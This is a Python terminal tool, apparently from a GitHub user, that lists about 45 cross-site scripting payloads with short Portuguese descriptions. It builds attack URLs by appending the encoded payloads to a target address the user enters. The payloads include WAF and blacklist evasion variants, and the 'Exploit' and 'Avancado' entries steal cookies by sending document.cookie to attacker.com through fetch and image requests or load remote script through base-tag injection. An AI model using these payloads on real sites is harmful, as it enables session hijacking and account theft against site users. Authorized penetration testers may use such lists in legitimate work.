#!/usr/bin/env python3
import os, sys, urllib.parse

B="\033[94m"; LB="\033[96m"; W="\033[97m"; DIM="\033[2m"
R="\033[91m"; Y="\033[93m"; RST="\033[0m"; BLD="\033[1m"
PAYLOADS = [
    ("Basico","<script>alert()</script>","Script classico. Primeiro teste."),
    ("Basico","<script>confirm()</script>","Confirm menos detectado que alert."),
    ("Basico","<img src=x onerror=alert()>","Img onerror sem fechar script."),
    ("Basico","<svg onload=alert()>","SVG onload, executa ao renderizar."),
    ("Basico","<details open ontoggle=alert()>","Tag details, dispara ao abrir."),
    ("Basico","<body onload=alert()>","Body onload."),
    ("Basico","<input autofocus onfocus=alert()>","Autofocus dispara onfocus."),
    ("HTML","</tag><svg onload=alert()>","Fecha tag atual e injeta SVG."),
    ("HTML","<embed src=//14.rs>","Embed externo, carrega JS remoto."),
    ("HTML","<iframe src=javascript:alert(1)>","Iframe com javascript: URI."),
    ("HTML","<object data=javascript:confirm()>","Object tag com JS URI."),
    ("HTML","<x onclick=confirm()>click</x>","Tag invalida, filtros ignoram."),
    ("Attribute",'"><svg onload=alert()>',"Fecha aspas e injeta SVG."),
    ("Attribute",'" onmouseover=alert() "',"Injeta handler onmouseover."),
    ("Attribute",'"autofocus/onfocus="alert()',"Autofocus dispara onfocus."),
    ("Attribute","javascript:alert()","Para href/src com URIs."),
    ("JS","'-alert()-'","Fecha string JS e executa."),
    ("JS","'-alert()//","Fecha string e comenta resto."),
    ("JS","</script><svg onload=alert()>","Fecha script injeta SVG."),
    ("JS","'}alert(1);{'","Input dentro de objeto JS."),
    ("SVG","<svg/onload=confirm()>","SVG sem espaco via barra."),
    ("SVG","<svg onload=confirm()//","SVG sem fechar com >."),
    ("SVG","<svg onload=co\\u006efirm()>","Unicode escape do n em confirm."),
    ("WAF","<a href=javas&#99;ript:alert(1)>click","Encode do c via entity."),
    ("WAF","<sCript x>(((confirm)))``</scRipt x>","Mixed case + triple confirm."),
    ("WAF","<x oncut=alert()>x","Evento oncut em tag invalida."),
    ("SemEspaco","<svg/onload=confirm()>","Barra substitui espaco."),
    ("SemEspaco","<iframe/src=javascript:alert(1)>","Iframe sem espaco."),
    ("SemEspaco","<img/src=x/onerror=alert()>","Img com barras."),
    ("Confirm","confirm``","Template literal sem parenteses."),
    ("Confirm","(((confirm)))``","Triple-wrapped confirm."),
    ("Confirm","[8].find(confirm)","Array.find com confirm."),
    ("Confirm","[8].map(confirm)","Array.map com confirm."),
    ("Confirm","[8].some(confirm)","Array.some com confirm."),
    ("Confirm","new class extends confirm``{}","Confirm via heranca ES6."),
    ("Blacklist","</ScRipT>","Mixed case no fechamento."),
    ("Blacklist","</script x>","Atributo extra no fechamento."),
    ("Blacklist","<scr<script>ipt>alert()</scr</script>ipt>","Script aninhado."),
    ("Encoding","<img src=x onerror=eval(atob('YWxlcnQoMSk='))>","alert base64."),
    ("Encoding","%3Cscript%3Ealert()%3C/script%3E","Script URL-encoded."),
    ("DOM","#<img src=x onerror=alert()>","Via location.hash innerHTML."),
    ("Exploit","<svg/onload=\"(new Image()).src='//attacker.com/'+document.cookie\">","Cookie stealer."),
    ("Exploit","<svg/onload=\"fetch('//attacker.com/?c='+document.cookie)\">","Fetch cookie."),
    ("Avancado","<iframe srcdoc=\"<script>alert(parent.document.cookie)</script>\">","XSS via srcdoc."),
    ("Avancado","<base href=//attacker.com/><script src=/xss.js></script>","Injeta base tag."),
]

CATEGORIES = list(dict.fromkeys(p[0] for p in PAYLOADS))
def clear(): os.system("cls" if os.name=="nt" else "clear")

def banner():
    print(f"""{B}{BLD}
  ██╗  ██╗███████╗███████╗
  ╚██╗██╔╝██╔════╝██╔════╝
   ╚███╔╝ ███████╗███████╗
   ██╔██╗ ╚════██║╚════██║
  ██╔╝ ██╗███████║███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝{RST}
{W}{BLD}         P A Y L O A D   X S S{RST}
{DIM}  https://github.com/Mrobot2937{RST}
{B}{"─"*40}{RST}""")

def show_payloads(payloads, url=""):
    for i,(cat,payload,desc) in enumerate(payloads,1):
        print(f"\n  {B}[{W}{BLD}{i:03d}{RST}{B}]{RST} {LB}{cat}{RST}")
        p = payload if len(payload)<=65 else payload[:62]+"..."
        print(f"  {W}{p}{RST}")
        print(f"  {DIM}{desc}{RST}")
        if url:
            full = url+urllib.parse.quote(payload,safe="")
            fd = full if len(full)<=62 else full[:59]+"..."
            print(f"  {LB}> {fd}{RST}")
        print(f"  {B}{"─"*38}{RST}")

def payload_menu(payloads, url):
    show_payloads(payloads, url)
    while True:
        print(f"\n  {DIM}numero = ver completo  b = voltar{RST}")
        c = input(f"{B}payload>{RST} ").strip().lower()
        if c=="b": break
        elif c.isdigit():
            n=int(c)
            if 1<=n<=len(payloads):
                cat,payload,desc=payloads[n-1]
                print(f"\n  {B}{"─"*38}{RST}")
                print(f"  {LB}[{n:03d}] {cat}{RST}")
                print(f"  {DIM}{desc}{RST}")
                print(f"\n  {W}{BLD}{payload}{RST}")
                if url:
                    full=url+urllib.parse.quote(payload,safe="")
                    print(f"\n  {LB}URL:{RST}")
                    print(f"  {W}{full}{RST}")
                print(f"  {B}{"─"*38}{RST}")
                input(f"\n  {DIM}[Enter]{RST}")

def main():
    clear(); banner()
    print(f"\n  {W}URL do Alvo:{RST}")
    print(f"  {DIM}ex: https://lab.com/search?q={RST}")
    print(f"  {DIM}vazio = so payloads{RST}")
    url = input(f"\n{B}>{RST} ").strip()
    if url: print(f"\n  {LB}OK{RST} {DIM}{url[:45]}{'...' if len(url)>45 else ''}{RST}")
    else: print(f"\n  {DIM}sem URL{RST}")
    input(f"  {DIM}[Enter]{RST}")

    while True:
        clear(); banner()
        if url: print(f"  {DIM}URL: {url[:40]}{'...' if len(url)>40 else ''}{RST}\n")

        cats = CATEGORIES
        mid = (len(cats)+1)//2
        col1 = cats[:mid]
        col2 = cats[mid:]

        print(f"  {B}[ CATEGORIAS ]{RST}\n")
        for i in range(mid):
            c1 = f"{B}[{i+1:02d}]{RST} {W}{col1[i]:<14}{RST} {DIM}({sum(1 for p in PAYLOADS if p[0]==col1[i])}){RST}"
            if i < len(col2):
                idx2 = mid+i+1
                c2 = f"{B}[{idx2:02d}]{RST} {W}{col2[i]:<14}{RST} {DIM}({sum(1 for p in PAYLOADS if p[0]==col2[i])}){RST}"
            else:
                c2 = ""
            print(f"  {c1}   {c2}")

        print(f"\n  {B}[00]{RST} {W}Todos{RST} {DIM}({len(PAYLOADS)}){RST}")
        print(f"  {B}[ S]{RST} {W}Buscar{RST}   {B}[ Q]{RST} {W}Sair{RST}")
        c = input(f"\n{B}>{RST} ").strip().lower()

        if c=="q": print(f"\n  {DIM}saindo...{RST}\n"); sys.exit(0)
        elif c=="s":
            t=input(f"  {W}buscar:{RST} ").strip().lower()
            r=[(ca,p,d) for ca,p,d in PAYLOADS if t in p.lower() or t in d.lower() or t in ca.lower()]
            if r: clear(); banner(); payload_menu(r,url)
            else: print(f"  {R}nenhum resultado.{RST}"); input(f"  {DIM}[Enter]{RST}")
        elif c in("0","00"):
            clear(); banner(); payload_menu(PAYLOADS,url)
        elif c.isdigit():
            n=int(c)
            if 1<=n<=len(CATEGORIES):
                cat=CATEGORIES[n-1]
                f=[(ca,p,d) for ca,p,d in PAYLOADS if ca==cat]
                clear(); banner(); payload_menu(f,url)

if __name__=="__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n  {DIM}saindo...{RST}\n"); sys.exit(0)
